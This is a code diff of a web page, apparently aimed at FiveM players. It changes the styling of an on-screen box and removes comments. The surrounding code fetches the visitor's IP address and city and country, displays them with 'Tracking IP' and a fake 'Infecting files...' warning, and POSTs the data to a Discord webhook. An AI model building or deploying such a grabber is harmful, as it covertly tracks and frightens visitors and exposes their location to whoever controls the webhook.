@@ -26,11 +26,11 @@
   #ipBox {
     position: absolute;
     bottom: 80px;
-    left: 5px; 
+    left: 20px; 
     transform: translate(-50%, -50%);
     font-size: 4em; 
     color: red;
-    text-shadow: 1px 1px 2px white, 1px 1px 2px white; 
+    text-shadow: 1px 1px 2px black, 1px 1px 2px black; 
     z-index: 2;
     padding: 10px; 
   }
@@ -69,17 +69,14 @@
   function fetchUserIpAndLocation(fivemUsername) {
     const ipBox = document.getElementById('ipBox');
     
-    // Fetch IP and location data
     fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`)
       .then(response => response.json())
       .then(data => {
-        // Update the content of ipBox with the fetched data
         ipBox.innerText =
           `Tracking IP: ${data.ip}\n` +
           `Fivem Username: ${fivemUsername || 'Unknown'}\n` +
           `Location: ${data.city}, ${data.country_name}\n` +
           'Infecting files...';
-        // Send data to Discord webhook
         fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
           headers: {
